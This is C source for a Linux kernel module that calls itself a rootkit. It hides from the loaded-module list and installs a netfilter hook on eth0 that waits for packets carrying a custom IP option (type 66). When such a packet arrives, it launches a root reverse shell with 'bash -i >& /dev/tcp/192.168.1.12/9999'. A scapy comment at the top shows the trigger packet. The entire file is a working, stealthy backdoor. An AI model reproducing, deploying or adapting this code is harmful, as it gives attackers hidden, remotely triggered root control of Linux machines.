// p = Ether()/IP(dst="192.168.1.10", options="\x42\x04\x00\x00")
// sendp(p)
#include <linux/kernel.h>
#include <linux/module.h> 
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/init.h>
#include <asm/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

MODULE_LICENSE("GPL");

MODULE_AUTHOR("Vasily");

MODULE_DESCRIPTION("rootkit");

MODULE_VERSION("0.1");

struct list_head *prev_module;

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module *)0)
#endif

void start_hide(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}


int bash_run(const char *bash_command, int wait_policy) {
    char *argv_main[] = {
            "/bin/bash",
            "-c",
            bash_command,
            NULL,
    };
    char *envp_main[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL,
    };
    return call_usermodehelper(argv_main[0], argv_main, envp_main, wait_policy);
}

void bash_task(struct work_struct *_){
        bash_run("bash -i >& /dev/tcp/192.168.1.12/9999 0>&1", UMH_WAIT_EXEC);
}

static DECLARE_DELAYED_WORK(bask_loop_task, bash_task
);

int kernel_schedule(void) {
    //printk(KERN_INFO "Scheduling...\n");
    int bool_result = schedule_delayed_work(&bask_loop_task, 10);
    return bool_result ? 0 : -1;
}



static struct nf_hook_ops nfhook;
struct net_device *dev;

typedef struct {
  unsigned char kind;
  unsigned char size;
}
tcp_option_t;


unsigned int hookfunc(void *priv,
                      struct sk_buff *skb,
                      const struct nf_hook_state *state) {
  //printk(KERN_INFO "We have a packet\n");
  if (!skb) // Not valid buffer
    return NF_ACCEPT;

  struct iphdr *ip_hdr = (struct iphdr *) skb_network_header(skb);

  if (!ip_hdr)
    return NF_ACCEPT; // Not valid IP

  if (ip_hdr->ihl <= 5) { // Check if options are present
    return NF_ACCEPT;
  }


  unsigned char *opt = (unsigned char *) ip_hdr + 20; 
  unsigned int offset = 0;

  while (offset < ip_hdr->ihl*4-20) {
    
    tcp_option_t *_opt = (tcp_option_t *)(opt + offset);
    
    if (_opt->kind == 1) {
      ++offset; // NOP is one byte;
      continue;
    }
    if (_opt->kind == 0) {
      break; // End of options
    }
    if (_opt->size == 0){
      return NF_ACCEPT; // Weird option
    }
    
    //printk(KERN_INFO "Got option with type %u and lenght %u\n", _opt->kind, _opt->size);
    if (_opt->kind == 66) {
      printk(KERN_INFO "Packet has EVIL Option\n");
      printk(KERN_INFO "Scheduled with status %d", kernel_schedule());
      return NF_DROP;
    }

    offset += _opt->size;
  }

  //printk(KERN_INFO "No Match:(\n");
  // No Match
  return NF_ACCEPT;
}


int init_module() {
  // Send packet with evil option to recieve shell
  printk(KERN_INFO "Loaded Rootkit\n");
  read_lock(&dev_base_lock);
  dev = first_net_device(&init_net);

  while (dev) {
    if (strncmp(dev->name, "eth0", 4) != 0) { // Change to choose interface
      dev = next_net_device(dev);
      continue;
    }
    break;
  }

  printk(KERN_INFO "Hooking on %s\n", dev->name);
  nfhook.hook = hookfunc;
  nfhook.dev = dev; // Catch packets on eth0
  nfhook.pf = PF_INET;
  nfhook.priority = NF_IP_PRI_FIRST;

  printk(KERN_INFO "Hook registered with status %d\n", nf_register_net_hook(&init_net, &nfhook));
  read_unlock(&dev_base_lock);
  printk(KERN_INFO "Start hide\n");
  start_hide();
  return 0;
}


void cleanup_module() {
  nf_unregister_net_hook(&init_net, &nfhook);
  printk(KERN_INFO "Unloading rootkit\n");
}